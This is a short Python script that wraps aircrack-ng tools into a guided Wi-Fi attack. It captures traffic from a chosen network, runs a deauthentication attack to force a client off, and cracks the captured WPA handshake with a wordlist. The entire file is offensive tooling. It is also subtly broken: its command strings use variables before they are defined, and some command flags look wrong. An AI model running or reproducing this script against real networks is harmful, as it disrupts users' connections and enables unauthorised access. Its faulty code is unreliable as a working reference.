import os
import sys
from termcolor import colored
import time

def  ac():
	ifcon = 'ifconfig'
	os.system(ifcon)
	userr = input('Is Your Wireless Adapter Running <y/n>:  ')
	if userr == 'y':
		pass
	elif userr == 'n':
		print('Please Get It Turned On')
		time.sleep(10)
	else:
		print(colored('Invalid Input'))

	start = 'airmon-ng start wlan0'
	kill = 'airmon-ng check kill'
	dump = 'airodump-ng wlan0mon'
	net = f'airodump-ng -c {channel} -bssid {bssid} wlan0mon'
	deauth = f'aireplay-ng --deauth 100 -a {bssid} -c {station} wlan0mon'
	cracker = f'aircrack-ng -w {wordlist} {dumpfile}'
	window = f'gnome-terminal -x {net}'

	os.system(start)
	os.system(kill)
	os.system(dump)
	channel = input('What Channel Is Your Target On: ')
	bssid = input('What Is The BSSID Of Target: ')

	variable = ''
	while variable != 'q':
		print(colored('PLEASE DO NOT CLOSE THE WINDOW THAT POPS UP', 'yellow'))
		print(colored('USE MOUSE TO TOGGLE BETWEEN WINDOWS (Move Your Way Back To Main Window In 15 Seconds', 'green'))
		os.system(window)
		os.system(net)
		time.sleep(10)

		userr3 = input('Would You Like To Perform A DEAUTH Attack <y/n>:  ')
		if userr3 == 'y':
			station = input('What Is The Station Attached To The Targets BSSID: ')
			os.system(window)
			time.sleep(3)
			os.system(deauth)
		if userr3 == 'n':
			print(colored('Wait Till You Receive A Handshake In Top Right Corner, Press "q + Enter" On Next Prompt When You Receive It', 'cyan'))
			print(colored('This May Take A While, Prompt Comes Up Every Minute', 'red'))
			time.sleep(60)
			variable = input('[c]ontinue OR [q]uit?')
			if variable == 'c':
				continue
			elif variable == 'q':
				pass
			else:
				print(colored('Invalid Input', 'red'))

	wordlist = input('/Provide/Path/To/Wordlist.txt:\n>  ')
	dumpfile = input('/Provide/Path/To/dumpfile.cap:\n>  ')
	os.system(cracker)

	stop = 'airmon-ng stop wlan0mon'
	restart = 'NetworkManager restart'
	os.system(stop)
	os.system(restart)

